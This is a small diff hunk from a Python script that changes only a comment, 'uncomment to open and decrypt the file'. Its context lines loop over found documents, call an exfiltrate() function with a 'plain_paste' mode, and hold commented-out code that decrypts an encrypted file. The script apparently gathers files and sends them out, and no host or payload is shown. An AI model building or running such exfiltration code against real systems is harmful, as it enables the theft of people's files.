@@ -46,7 +46,7 @@ if __name__ == '__main__':
     for fpath in find_docs():
         exfiltrate("test.txt", 'plain_paste')
     
-    # open and decrypt
+    # uncomment to open and decrypt the file
     # with open('test.enc', 'rb') as f:
     #     encrypted = f.read()
     # with open('test.dec', 'wb') as f:
